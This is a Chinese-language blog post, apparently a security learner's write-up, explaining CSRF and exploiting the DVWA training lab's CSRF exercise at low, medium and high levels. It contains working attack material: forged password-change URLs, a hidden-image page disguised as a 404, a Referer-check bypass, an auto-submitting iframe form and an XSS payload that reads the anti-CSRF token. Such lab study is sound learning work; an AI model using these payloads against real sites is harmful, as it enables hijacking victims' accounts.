@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>CSRF产生原理 | The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class="logo" href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id="post">
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>CSRF产生原理</h1>
+          <div class="post-meta">
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/03/08</time>
+            
+            
+          </div>
+          <p>参考链接：<a href="https://www.cnblogs.com/wangyuyu/p/3388169.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangyuyu/p/3388169.html</a><br>参考链接：<a href="https://blog.csdn.net/yaofeino1/article/details/54667698" target="_blank" rel="noopener">https://blog.csdn.net/yaofeino1/article/details/54667698</a></p>
+<h1 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h1><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
+<h1 id="有什么用？"><a href="#有什么用？" class="headerlink" title="有什么用？"></a>有什么用？</h1><p>你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>
+<h1 id="CSRF如何实现？"><a href="#CSRF如何实现？" class="headerlink" title="CSRF如何实现？"></a>CSRF如何实现？</h1><p>个人认为关于CSRF的原理应该重新复习一下HTTP中关于cookie的知识点，学习到至今，感觉cookie无处不在。</p>
+<p>还是附上那张图<br><img src="/2019/03/08/CSRF产生原理/1.png" alt=""></p>
+<p>当我们登录一个网站后，于是浏览器中就种下了cookie，保持登录的状态，那此时session的状态是处于登录的。攻击者诱使被攻击者点击攻击链接，因为处于session状态，所以只要构造的攻击链符合同源策略，就能使被攻击者受到攻击。</p>
+<h1 id="dvwa-csrf"><a href="#dvwa-csrf" class="headerlink" title="dvwa-csrf"></a>dvwa-csrf</h1><p>现在，我们使用dvwa中的csrf来理解此漏洞。</p>
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>使用get方法不安全，仅为实验<br>观察源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>)); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>用户修改密码的时候，其url为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.40/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><br></pre></td></tr></table></figure></p>
+<p>在其保持登录的情况下,我们构造payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.40/dvwa/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#</span><br></pre></td></tr></table></figure></p>
+<p>当dvwa为登出的情况下，由于此浏览器已经种下该网站的cookie,所以我们构造payload后，被攻击者点击此payload时，发出此攻击http请求时，会带上之前的cookie值，服务器对其认证，通过，于是此次攻击达到目的，修改了密码。</p>
+<p>但是这里有一个问题，就是如何诱导用户去点击该链接,因为这个太明显了，所以我们构造一个html页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://192.168.43.40/dvwa/vulnerabilities/csrf/?password_new=cookie&amp;password_conf=cookie&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure></p>
+<p>链接为：<a href="http://192.168.43.40/hack.html" target="_blank" rel="noopener">http://192.168.43.40/hack.html</a><br>当用户在登录状态下去访问，密码便会被修改。</p>
+<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>观察源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Checks to see where the request came from </span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="keyword">false</span> ) &#123; </span><br><span class="line">        <span class="comment">// Get input </span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// They do! </span></span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>)); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database </span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Issue with passwords matching </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Didn't come from a trusted source </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>代码中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="keyword">false</span> ) &#123;</span><br></pre></td></tr></table></figure></p>
+<p>判断referer中是否包含host.<br>这是用来防御CSRF的发生,判断是不是本站的操作，还是通过恶意网站登录的。<br>如果是通过<a href="http://192.168.43.41/hack.html" target="_blank" rel="noopener">http://192.168.43.41/hack.html</a> 跨站登录的,referer就是:<a href="http://192.168.43.41/hack.html" target="_blank" rel="noopener">http://192.168.43.41/hack.html</a><br>，那么host为192.168.43.40，所以此时起到防御跨站伪装的攻击。</p>
+<p>然后我们的解决策略就是把hack.html改成192.168.43.40.html,那么攻击页面就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.41/192.168.43.40.html</span><br></pre></td></tr></table></figure></p>
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>观察源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>)); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这里的启用了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
+<p>这里所谓的token就是令牌，关于token和session的差别下次详讲。</p>
+<p>每访问一次改密页面时，服务器就返回一个随机的token，这样子我们使用先前的攻击方式就不可以了，因为被攻击者通过攻击链接登录时请求修改密码的token，和他自身登录状态下产生的token不同了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heckToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure></p>
+<p>所以我们要想个办法来获取用户在登录状态下的token.</p>
+<p>构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">   document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value=document.getElementById(<span class="string">"hack"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span><br><span class="line"></span><br><span class="line">  document.getElementById(<span class="string">"transfer"</span>).submit(); </span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;iframe src=<span class="string">"http://192.168.43.40/dvwa/vulnerabilities/csrf"</span> id=<span class="string">"hack"</span> border=<span class="string">"0"</span> style=<span class="string">"display:none;"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;body onload=<span class="string">"attack()"</span>&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form method=<span class="string">"GET"</span> id=<span class="string">"transfer"</span> action=<span class="string">"http://192.168.153.130/dvwa/vulnerabilities/csrf"</span>&gt;</span><br><span class="line"></span><br><span class="line">   &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_new"</span> value=<span class="string">"password"</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"password"</span>&gt;</span><br><span class="line"></span><br><span class="line">   &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"user_token"</span> value=<span class="string">""</span>&gt;</span><br><span class="line"></span><br><span class="line">  &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span>&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p>
+<p>但是这样有点问题，就是由于同源策略的存在，假使攻击脚本在192.168.43.41上，框架iframe访问的地址是192.168.43.40/dvwa/vulnerabilities/csrf，同源策略不允许A域名下的页面主动去获取B域名下的页面，这里就涉及到跨域的问题。所以为了绕过这种问题，我们要借助xss漏洞。</p>
+<p>由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器192.168.43.40中，才有可能完成攻击。</p>
+<p>下面利用High级别的XSS漏洞协助获取Anti-CSRF token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token）。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"../csrf"</span> onload=alert(frames[<span class="number">0</span>].document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value)&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/03/08/CSRF产生原理/2.png" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>同源策略还有跨域的思维几乎贯穿了整个攻击过程，以及对于HTTP的理解也是相当重要。</p>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#什么是CSRF？"><span class="toc-number">1.</span> <span class="toc-text">什么是CSRF？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#有什么用？"><span class="toc-number">2.</span> <span class="toc-text">有什么用？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF如何实现？"><span class="toc-number">3.</span> <span class="toc-text">CSRF如何实现？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dvwa-csrf"><span class="toc-number">4.</span> <span class="toc-text">dvwa-csrf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">4.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">4.2.</span> <span class="toc-text">medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">4.3.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/2019/03/08/CSRF产生原理/";
+  var disqus_url = "http://yoursite.com/2019/03/08/CSRF产生原理/";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
